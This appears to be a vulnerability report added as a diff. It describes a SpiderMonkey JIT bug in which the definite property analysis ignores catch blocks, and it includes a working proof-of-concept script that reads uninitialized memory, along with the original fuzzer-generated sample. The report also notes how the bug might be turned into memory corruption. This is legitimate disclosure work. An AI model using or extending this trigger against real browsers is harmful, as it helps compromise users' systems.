@@ -1,0 +1,82 @@
+/*
+For constructors, Spidermonkey implements a "definite property analysis" [1] to compute which properties will definitely exist on the constructed objects. Spidermonkey then directly allocates the constructed objects with the final Shape. As such, at the entrypoint of the constructor the constructed objects will already "look like" they have all the properties that are only installed throughout the constructor. This mechanism e.g. makes it possible to omit some Shape updates in JITed code. See also https://bugs.chromium.org/p/project-zero/issues/detail?id=1791 for another short explanation of this mechanism.
+
+The definite property analysis must ensure that "predefining" the properties in such a way will not be visible to the running script. In particular, it can only mark properties as definite if they aren't read or otherwise accessed before the assignment.
+
+In the following JavaScript program, discovered through fuzzing and then manually modified, Spidermonkey appears to incorrectly handle such a scenario:
+*/
+
+    l = undefined;
+
+    function v10() {
+        let v15 = 0;
+        try {
+            const v16 = v15.foobar();
+        } catch(v17) {
+            l = this.uninitialized;
+        }
+        this.uninitialized = 1337;
+    }
+
+    for (let v36 = 0; v36 < 100; v36++) {
+        const v38 = new v10();
+        if (l !== undefined) {
+            console.log("Success: 0x" + l.toString(16));
+            break;
+        }
+    }
+
+/*
+When run on a local Spidermonkey built from the beta branch or in Firefox 66.0.3 with `javascript.options.unboxed_objects` set to true in about:config, it will eventually output something like:
+
+	Success: 0x2d2d2d2d
+
+Here, the definite property analysis concluded that .uninitialized is definitely assigned to the constructed objects and not accessed before it is assigned (which is wrong). In particular, it seems that the catch block is entirely ignored by the analysis as it is not present in the Ion graph representation of v10 on which the analysis is performed. As such, when reading .uninitialized in the catch block, uninitialized memory (which seems to be initialized with 0x2d in debug builds) is read from `this` and later printed to stdout. If the line `this.uninitialized = 1337;` is modified to instead assign a double value (e.g. `this.uninitialized = 13.37;`), then an assertion failure can be observed:
+
+    Assertion failure: isDouble(), at js/src/build_DBG.OBJ/dist/include/js/Value.h:450
+
+As unboxed properties can also store JSObject pointers, this bug can likely be turned into memory corruption as well. However, since this requires unboxed object, which have recently been disabled by default and appear to be fully removed soon, it likely only affects non-standard configurations of FireFox. If unboxed objects are disabled (e.g. through --no-unboxed-objects), then the analysis will still be incorrect and determine that .uninitialized can be "predefined". This can be observed by changing `l = this.uninitialized;` to `l = this.hasOwnProperty('uninitialized');` which will incorrectly return true. In that case, the property slots seem to be initialized with `undefined` though, so no memory safety violation occurs. However, I have not verified that they will always be initialized in that way. Furthermore, it might be possible to confuse property type inference in that case, but I have not attempted that.
+
+
+Below is the original sample triggered by fuzzilli. It ended up reading the property by spreading |this|.
+
+    // Run with --no-threads --ion-warmup-threshold=100
+    function main() {
+    const v3 = Object != Object;
+    let v4 = v3;
+    const v5 = typeof undefined;
+    const v7 = v5 === "undefined";
+    const v9 = Array();
+    function v10(v11,v12) {
+        let v15 = 0;
+        try {
+            const v16 = v15.race();
+        } catch(v17) {
+            for (let v21 = 0; v21 < 7; v21++) {
+                let v24 = 0;
+                while (v24 < 256) {
+                    const v25 = v24 + 1;
+                    v24 = v25;
+                }
+                const v26 = Array == v21;
+                const v27 = {trimStart:v4,seal:v10,...v26,...v9,...v26,...v26,...this,...v7};
+            }
+        }
+        for (let v30 = 0; v30 < 9; v30++) {
+        }
+        const v31 = v4 + 1;
+        this.E = v31;
+    }
+    const v32 = v10();
+    for (let v36 = 0; v36 < 5; v36++) {
+        const v38 = new v10();
+        let v39 = Object;
+        const v41 = Object();
+        const v42 = v41.getOwnPropertyDescriptors;
+        let v43 = v42;
+        const v44 = {LN10:v42,unshift:Object,isFinite:Object,test:v41,...v43,...v39,...v41};
+    }
+    }
+    main();
+    gc();
+*/
